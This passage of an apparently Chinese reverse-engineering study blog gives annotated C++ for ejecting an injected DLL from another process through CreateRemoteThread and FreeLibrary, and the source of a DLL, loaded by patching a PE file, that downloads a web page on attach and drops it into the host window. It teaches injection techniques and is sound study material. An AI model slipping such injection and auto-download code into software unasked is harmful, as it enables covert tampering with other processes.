class="hljs-built_in">GetLastError</span>());<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">GetLastError</span>() == ERROR_NOT_ALL_ASSIGNED)<br>&#123;<br>_tprintf(<span class="hljs-string">L&quot;The token does not have the specified privilege.\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br><span class="hljs-function">BOOL <span class="hljs-title">EjectDll</span><span class="hljs-params">(DWORD dwPID, LPCTSTR szDllName)</span></span><br><span class="hljs-function"></span>&#123;<br>BOOL bMore = FALSE, bFound = FALSE;<br>HANDLE hSnapshot, hProcess, hThread;<br>HMODULE hModule = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">* 描述属于指定进程的模块列表中的条目</span><br><span class="hljs-comment">* typedef struct tagMODULEENTRY32 &#123;</span><br><span class="hljs-comment">*DWORD   dwSize;结构的大小，以字节为单位</span><br><span class="hljs-comment">*DWORD   th32ModuleID;该成员不再使用，并且始终设置为 1</span><br><span class="hljs-comment">*DWORD   th32ProcessID;要检查其模块的进程的标识符</span><br><span class="hljs-comment">*DWORD   GlblcntUsage;模块的加载计数，一般没有意义，通常等于 0xFFFF</span><br><span class="hljs-comment">*DWORD   ProccntUsage;模块的加载计数（与GlblcntUsage相同），通常没有意义，通常等于 0xFFFF</span><br><span class="hljs-comment">*BYTE    *modBaseAddr;拥有进程上下文中模块的基地址</span><br><span class="hljs-comment">*DWORD   modBaseSize;模块的大小，以字节为单位</span><br><span class="hljs-comment">*HMODULE hModule;拥有进程上下文中的模块句柄</span><br><span class="hljs-comment">*char    szModule[MAX_MODULE_NAME32 + 1];模块名称</span><br><span class="hljs-comment">*char    szExePath[MAX_PATH];模块路径</span><br><span class="hljs-comment">*&#125; MODULEENTRY32;</span><br><span class="hljs-comment">*/</span><br>MODULEENTRY32 me = &#123; <span class="hljs-built_in">sizeof</span>(me) &#125;;<br><br>LPTHREAD_START_ROUTINE pThreadProc;<br><br>hSnapshot = <span class="hljs-built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPMODULE, dwPID);<br><br>bMore = <span class="hljs-built_in">Module32First</span>(hSnapshot, &amp;me);<br><span class="hljs-keyword">for</span> (; bMore; bMore = <span class="hljs-built_in">Module32Next</span>(hSnapshot, &amp;me))<br>&#123;<br><span class="hljs-keyword">if</span> (!_tcsicmp((LPCTSTR)me.szModule, szDllName) ||<br>!_tcsicmp((LPCTSTR)me.szExePath, szDllName))<br>&#123;<br>bFound = TRUE;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (!bFound)<br>&#123;<br><span class="hljs-built_in">CloseHandle</span>(hSnapshot);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><br><span class="hljs-keyword">if</span> (!(hProcess = <span class="hljs-built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPID)))<br>&#123;<br>_tprintf(<span class="hljs-string">L&quot;OpenProcess(%d) failed!!! [%d]\n&quot;</span>, dwPID, <span class="hljs-built_in">GetLastError</span>());<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>hModule = <span class="hljs-built_in">GetModuleHandle</span>(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);<br>pThreadProc = (LPTHREAD_START_ROUTINE)<span class="hljs-built_in">GetProcAddress</span>(hModule, <span class="hljs-string">&quot;FreeLibrary&quot;</span>);<br><br>hThread = <span class="hljs-built_in">CreateRemoteThread</span>(hProcess, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, pThreadProc, me.modBaseAddr, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-built_in">WaitForSingleObject</span>(hThread, INFINITE);<br><br><span class="hljs-built_in">CloseHandle</span>(hThread);<br><span class="hljs-built_in">CloseHandle</span>(hProcess);<br><span class="hljs-built_in">CloseHandle</span>(hSnapshot);<br>&#125;<br><br><span class="hljs-type">int</span> _tmain(<span class="hljs-type">int</span> argc, TCHAR* argv[])<br>&#123;<br>DWORD dwPID = <span class="hljs-number">0xFFFFFFFF</span>;<br><br>dwPID = <span class="hljs-built_in">FindProcessID</span>(DEF_PROC_NAME);<br><span class="hljs-keyword">if</span> (dwPID == <span class="hljs-number">0xFFFFFFFF</span>)<br>&#123;<br>_tprintf(<span class="hljs-string">L&quot;There is no %s process!\n&quot;</span>, DEF_PROC_NAME);<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br>_tprintf(<span class="hljs-string">L&quot;PID of \&quot;%s\&quot; is %d \n&quot;</span>, DEF_PROC_NAME, dwPID);<br><br><span class="hljs-comment">//将进程的权限改为调试</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">SetPrivilege</span>(SE_DEBUG_NAME, TRUE))<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><br><span class="hljs-comment">//将myhack.dll卸载</span><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">EjectDll</span>(dwPID, DEF_DLL_NAME))<br>_tprintf(<span class="hljs-string">L&quot;EjectDll(%d, \&quot;%s\&quot;) success!!!\n&quot;</span>, dwPID, DEF_DLL_NAME);<br><span class="hljs-keyword">else</span><br>_tprintf(<span class="hljs-string">L&quot;EjectDll(%d, \&quot;%s\&quot;) failed!!!\n&quot;</span>, dwPID, DEF_DLL_NAME);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="通过修改PE加载DLL"><a href="#通过修改PE加载DLL" class="headerlink" title="通过修改PE加载DLL"></a>通过修改PE加载DLL</h1><h2 id="myhack3"><a href="#myhack3" class="headerlink" title="myhack3"></a>myhack3</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;pch.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;tchar.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;ShlObj.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;WinInet.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib,<span class="hljs-string">&quot;Wininet.lib&quot;</span>)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEF_BUF_SIZE (4096)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEF_URL <span class="hljs-string">L&quot;https://www.baidu.com&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEF_INDEX_FILE <span class="hljs-string">L&quot;index.html&quot;</span></span><br><br>HWND g_hWnd = <span class="hljs-literal">NULL</span>;<br><span class="hljs-function">BOOL <span class="hljs-title">DownloadURL</span><span class="hljs-params">(LPCTSTR szURL, LPCTSTR szFile)</span></span><br><span class="hljs-function"></span>&#123;<br>    BOOL bRet = FALSE;<br>    <span class="hljs-comment">//需要导入wininet.h</span><br>    <span class="hljs-comment">//typedef LPVOID HINTERNET;</span><br>    HINTERNET hInternet = <span class="hljs-literal">NULL</span>, hURL = <span class="hljs-literal">NULL</span>;<br>    BYTE pBuf[DEF_BUF_SIZE] = &#123; <span class="hljs-number">0</span>, &#125;;<br>    DWORD dwBytesRead = <span class="hljs-number">0</span>;<br>    FILE* pFile = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-comment">//typedef int errno_t;</span><br>    <span class="hljs-type">errno_t</span> err = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    * 初始化应用程序对 WinINet 函数的使用</span><br><span class="hljs-comment">    * HINTERNET InternetOpenA(</span><br><span class="hljs-comment">    *    [in] LPCSTR lpszAgent,指向以null结尾的字符串的指针，该字符串指定调用 WinINet 函数的应用程序或实体的名称。此名称用作 HTTP 协议中的用户代理。</span><br><span class="hljs-comment">    *    [in] DWORD  dwAccessType,所需的访问类型。INTERNET_OPEN_TYPE_PRECONFIG，从注册表中检索代理或直接配置。</span><br><span class="hljs-comment">    *    [in] LPCSTR lpszProxy,指向以null结尾的字符串的指针，该字符串指定代理服务器的名称。如果 dwAccessType未设置为 INTERNET_OPEN_TYPE_PROXY，此参数被忽略，应为NULL</span><br><span class="hljs-comment">    *         LPCTSTR lpszProxyBypass,指向以空字符结尾的字符串的长指针，该字符串包含主机名或 IP 地址或两者的可选列表，不应通过代理进行路由。如果此参数为 NULL，则该函数从注册表中读取绕过列表。</span><br><span class="hljs-comment">    *    [in] DWORD  dwFlags，指定影响函数行为的各种选项。</span><br><span class="hljs-comment">    *    );</span><br><span class="hljs-comment">    * 返回值：应用程序传递给后续 Win32 Internet 函数的有效句柄表示成功</span><br><span class="hljs-comment">    */</span><br>    hInternet = <span class="hljs-built_in">InternetOpen</span>(<span class="hljs-string">L&quot;ReverseCore&quot;</span>,<br>        INTERNET_OPEN_TYPE_PRECONFIG,<br>        <span class="hljs-literal">NULL</span>,<br>        <span class="hljs-literal">NULL</span>,<br>        <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">if</span> (hInternet == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">OutputDebugString</span>(<span class="hljs-string">L&quot;InternetOpen() failed!&quot;</span>);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    * 打开由完整的 FTP 或 HTTP URL 指定的资源</span><br><span class="hljs-comment">    * HINTERNET InternetOpenUrlA(</span><br><span class="hljs-comment">    *    [in] HINTERNET hInternet, 当前 Internet 会话的句柄</span><br><span class="hljs-comment">    *    [in] LPCSTR    lpszUrl,指向以null结尾的字符串变量的指针，该变量指定要开始读取的 URL</span><br><span class="hljs-comment">    *    [in] LPCSTR    lpszHeaders,指向以null结尾的字符串的指针，该字符串指定要发送到 HTTP 服务器的标头</span><br><span class="hljs-comment">    *    [in] DWORD     dwHeadersLength,附加标头的大小，以TCHARs为单位。</span><br><span class="hljs-comment">    *    [in] DWORD     dwFlags,INTERNET_FLAG_RELOAD,强制从源服务器下载请求的文件、对象或目录列表，而不是从缓存中。</span><br><span class="hljs-comment">    *    [in] DWORD_PTR dwContext,一个指向变量的指针，该变量指定应用程序定义的值，该值连同返回的句柄一起传递给任何回调函数。</span><br><span class="hljs-comment">    *    );</span><br><span class="hljs-comment">    */</span><br>    hURL = <span class="hljs-built_in">InternetOpenUrl</span>(<br>        hInternet,<br>        szURL,<br>        <span class="hljs-literal">NULL</span>,<br>        <span class="hljs-number">0</span>,<br>        INTERNET_FLAG_RELOAD,<br>        <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">if</span> (hURL == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">OutputDebugString</span>(<span class="hljs-string">L&quot;InternetOpenUrl() failed!&quot;</span>);<br>        <span class="hljs-keyword">goto</span> _DownloadURL_EXIT;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (_tfopen_s(&amp;pFile, szFile, <span class="hljs-string">L&quot;wt&quot;</span>))<br>    &#123;<br>        <span class="hljs-built_in">OutputDebugString</span>(<span class="hljs-string">L&quot;fopen() failed!&quot;</span>);<br>        <span class="hljs-keyword">goto</span> _DownloadURL_EXIT;<br>    &#125;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    * 从InternetOpenUrl、 FtpOpenFile或 HttpOpenRequest函数打开的句柄中读取数据</span><br><span class="hljs-comment">    * BOOL InternetReadFile(</span><br><span class="hljs-comment">    *    [in]  HINTERNET hFile,从先前调用 InternetOpenUrl、 FtpOpenFile或 HttpOpenRequest返回的句柄</span><br><span class="hljs-comment">    *    [out] LPVOID    lpBuffer,指向接收数据的缓冲区的指针</span><br><span class="hljs-comment">    *    [in]  DWORD     dwNumberOfBytesToRead,要读取的字节数</span><br><span class="hljs-comment">    *    [out] LPDWORD   lpdwNumberOfBytesRead,指向接收读取字节数的变量的指针</span><br><span class="hljs-comment">    *    );</span><br><span class="hljs-comment">    */</span><br><br>    <span class="hljs-comment">//将网络资源文件写入本地文件中</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-built_in">InternetReadFile</span>(hURL, pBuf, DEF_BUF_SIZE, &amp;dwBytesRead))<br>    &#123;<br>        <span class="hljs-keyword">if</span> (!dwBytesRead)<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        * 把 ptr 所指向的数组中的数据写入到给定流 stream 中</span><br><span class="hljs-comment">        * size_t fwrite(const void *ptr, size_t size, size_t nmemb, FILE *stream)</span><br><span class="hljs-comment">        * ptr -- 这是指向要被写入的元素数组的指针</span><br><span class="hljs-comment">        * size -- 这是要被写入的每个元素的大小，以字节为单位</span><br><span class="hljs-comment">        * nmemb -- 这是元素的个数，每个元素的大小为 size 字节</span><br><span class="hljs-comment">        * stream -- 这是指向 FILE 对象的指针，该 FILE 对象指定了一个输出流</span><br><span class="hljs-comment">        */</span><br>        <span class="hljs-built_in">fwrite</span>(pBuf, dwBytesRead, <span class="hljs-number">1</span>, pFile);<br>    &#125;<br><br>_DownloadURL_EXIT:<br>    <span class="hljs-keyword">if</span> (pFile)<br>        <span class="hljs-built_in">fclose</span>(pFile);<br>    <span class="hljs-keyword">if</span> (hURL)<br>        <span class="hljs-built_in">InternetCloseHandle</span>(hURL);<br>    <span class="hljs-keyword">if</span> (hInternet)<br>        <span class="hljs-built_in">InternetCloseHandle</span>(hInternet);<br>    <span class="hljs-keyword">return</span> bRet;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">* 与EnumWindows或EnumDesktopWindows函数一起使用的应用程序定义的回调函数</span><br><span class="hljs-comment">* BOOL CALLBACK EnumWindowsProc(</span><br><span class="hljs-comment">*  _In_ HWND   hwnd,顶级窗口的句柄</span><br><span class="hljs-comment">*  _In_ LPARAM lParam,lParam [in] EnumWindows或EnumDesktopWindows中给出的应用程序定义的值</span><br><span class="hljs-comment">*   );</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function">BOOL CALLBACK <span class="hljs-title">EnumWindowsProc</span><span class="hljs-params">(HWND hWnd, LPARAM lParam)</span></span><br><span class="hljs-function"></span>&#123;<br>    DWORD dwPID = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    * 检索创建指定窗口的线程的标识符，以及（可选）创建窗口的进程的标识符</span><br><span class="hljs-comment">    * DWORD GetWindowThreadProcessId(</span><br><span class="hljs-comment">    *    [in]            HWND    hWnd,窗口的句柄。</span><br><span class="hljs-comment">    *    [out, optional] LPDWORD lpdwProcessId,指向接收进程标识符的变量的指针</span><br><span class="hljs-comment">    *    );</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-built_in">GetWindowThreadProcessId</span>(hWnd, &amp;dwPID);<br><br>    <span class="hljs-keyword">if</span> (dwPID == (DWORD)lParam)<br>    &#123;<br>        g_hWnd = hWnd;<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br><span class="hljs-function">HWND <span class="hljs-title">GetWindowHandleFromPID</span><span class="hljs-params">(DWORD dwPID)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    * 通过将每个窗口的句柄依次传递给应用程序定义的回调函数来枚举屏幕上的所有顶级窗口。EnumWindows一直持续到枚举最后一个顶级窗口或回调函数返回FALSE</span><br><span class="hljs-comment">    * BOOL EnumWindows(</span><br><span class="hljs-comment">    *    [in] WNDENUMPROC lpEnumFunc,指向应用程序定义的回调函数的指针</span><br><span class="hljs-comment">    *    [in] LPARAM      lParam,要传递给回调函数的应用程序定义的值</span><br><span class="hljs-comment">    *    );</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-built_in">EnumWindows</span>(EnumWindowsProc, dwPID);<br>    <span class="hljs-keyword">return</span> g_hWnd;<br>&#125;<br><br><span class="hljs-comment">//需要#include&lt;shlobj.h&gt;</span><br><span class="hljs-function">BOOL <span class="hljs-title">DropFile</span><span class="hljs-params">(LPCTSTR wcsFile)</span></span><br><span class="hljs-function"></span>&#123;<br>    HWND hWnd = <span class="hljs-literal">NULL</span>;<br>    DWORD dwBufSize = <span class="hljs-number">0</span>;<br>    BYTE* pBuf = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    * 定义CF_HDROP剪贴板格式</span><br><span class="hljs-comment">    * typedef struct _DROPFILES &#123;</span><br><span class="hljs-comment">    *    DWORD pFiles;文件列表从此结构开头的偏移量，以字节为单位</span><br><span class="hljs-comment">    *    POINT pt;落点。坐标取决于fNC</span><br><span class="hljs-comment">    *    BOOL  fNC;非客户区标志。如果此成员为TRUE，则pt指定窗口非客户区中某个点的屏幕坐标。如果它是FALSE，pt指定客户区域中一个点的客户坐标</span><br><span class="hljs-comment">    *    BOOL  fWide;指示文件是否包含 ANSI 或 Unicode 字符的值。如果该值为零，则文件包含 ANSI 字符。否则，它包含 Unicode 字符</span><br><span class="hljs-comment">    *    &#125; DROPFILES, *LPDROPFILES;</span><br><span class="hljs-comment">    */</span><br>    DROPFILES* pDrop = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">char</span> szFile[MAX_PATH] = &#123; <span class="hljs-number">0</span>, &#125;;<br>    HANDLE hMem = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    * 将 UTF-16（宽字符）字符串映射到新字符串</span><br><span class="hljs-comment">    * int WideCharToMultiByte(</span><br><span class="hljs-comment">    *    [in]            UINT                               CodePage,用于执行转换的代码页,CP_ACP,系统默认的 Windows ANSI 代码页。</span><br><span class="hljs-comment">    *    [in]            DWORD                              dwFlags,指示转换类型的标志</span><br><span class="hljs-comment">    *    [in]            _In_NLS_string_(cchWideChar)LPCWCH lpWideCharStr,指向要转换的 Unicode 字符串的指针</span><br><span class="hljs-comment">    *    [in]            int                                cchWideChar,lpWideCharStr指示的字符串的大小（以字符为单位） 。或者，如果字符串以 null 结尾，则可以将此参数设置为 -1</span><br><span class="hljs-comment">    *    [out, optional] LPSTR                              lpMultiByteStr,指向接收转换后字符串的缓冲区的指针</span><br><span class="hljs-comment">    *    [in]            int                                cbMultiByte,lpMultiByteStr指示的缓冲区的大小（以字节为单位）</span><br><span class="hljs-comment">    *    [in, optional]  LPCCH                              lpDefaultChar,指向在指定代码页中无法表示字符时要使用的字符的指针。如果函数要使用系统默认值，则应用程序将此参数设置为NULL</span><br><span class="hljs-comment">    *    [out, optional] LPBOOL                             lpUsedDefaultChar,指向一个标志的指针，该标志指示函数是否在转换中使用了默认字符。如果源字符串中的一个或多个字符不能在指定的代码页中表示，则该标志设置为TRUE 。否则，标志设置为FALSE。该参数可以设置为NULL。</span><br><span class="hljs-comment">    *    );</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-built_in">WideCharToMultiByte</span>(CP_ACP, <span class="hljs-number">0</span>, wcsFile, <span class="hljs-number">-1</span>, szFile, MAX_PATH, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    * 锁定一个全局内存对象并返回一个指向对象内存块第一个字节的指针</span><br><span class="hljs-comment">    * LPVOID GlobalLock(</span><br><span class="hljs-comment">    *    [in] HGLOBAL hMem,全局内存对象的句柄</span><br><span class="hljs-comment">    *    );</span><br><span class="hljs-comment">    */</span><br>    pBuf = (LPBYTE)<span class="hljs-built_in">GlobalLock</span>(hMem);<br>    pDrop = (DROPFILES*)pBuf;<br>    pDrop-&gt;pFiles = <span class="hljs-built_in">sizeof</span>(DROPFILES);<br>    <span class="hljs-built_in">strcpy_s</span>((<span class="hljs-type">char</span>*)(pBuf + <span class="hljs-built_in">sizeof</span>(DROPFILES)), <span class="hljs-built_in">strlen</span>(szFile) + <span class="hljs-number">1</span>, szFile);<br><br>    <span class="hljs-built_in">GlobalUnlock</span>(hMem);<br><br>    <span class="hljs-keyword">if</span> (!(hWnd = <span class="hljs-built_in">GetWindowHandleFromPID</span>(<span class="hljs-built_in">GetCurrentProcessId</span>())))<br>    &#123;<br>        <span class="hljs-built_in">OutputDebugString</span>(<span class="hljs-string">L&quot;GetWndHandleFromPID() failed!!!&quot;</span>);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    * 在与创建指定窗口的线程关联的消息队列中放置（发布）一条消息，并在不等待线程处理消息的情况下返回。</span><br><span class="hljs-comment">    * BOOL PostMessageA(</span><br><span class="hljs-comment">    *    [in, optional] HWND   hWnd,一个窗口句柄，其窗口过程将接收消息</span><br><span class="hljs-comment">    *    [in]           UINT   Msg,要发布的消息</span><br><span class="hljs-comment">    *    [in]           WPARAM wParam,其他特定于消息的信息</span><br><span class="hljs-comment">    *    [in]           LPARAM lParam,其他特定于消息的信息</span><br><span class="hljs-comment">    *    );</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-built_in">PostMessage</span>(hWnd, WM_DROPFILES, (WPARAM)pBuf, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">return</span> TRUE;<br><br>&#125;<br><span class="hljs-function">DWORD WINAPI <span class="hljs-title">ThreadProc</span><span class="hljs-params">(LPVOID lParam)</span></span><br><span class="hljs-function"></span>&#123;<br>    TCHAR szPath[MAX_PATH] = &#123; <span class="hljs-number">0</span>, &#125;;<br>    TCHAR* p = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-built_in">GetModuleFileName</span>(<span class="hljs-literal">NULL</span>, szPath, <span class="hljs-built_in">sizeof</span>(szPath));<br><br>    <span class="hljs-keyword">if</span> (p = _tcsrchr(szPath, <span class="hljs-string">L&#x27;\\&#x27;</span>))<br>    &#123;<br>        _tcscpy_s(p + <span class="hljs-number">1</span>, <span class="hljs-built_in">wcslen</span>(DEF_INDEX_FILE) + <span class="hljs-number">1</span>, DEF_INDEX_FILE);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">DownloadURL</span>(DEF_URL, szPath))<br>        &#123;<br>            <span class="hljs-built_in">DropFile</span>(szPath);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">( HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">                       DWORD  ul_reason_for_call,</span></span><br><span class="hljs-params"><span class="hljs-function">                       LPVOID lpReserved</span></span><br><span class="hljs-params"><span class="hljs-function">                     )</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">switch</span> (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-built_in">CloseHandle</span>(<span class="hljs-built_in">CreateThread</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, ThreadProc, <span class="hljs-literal">NULL</span>,<span class="hljs-number">0</span>, 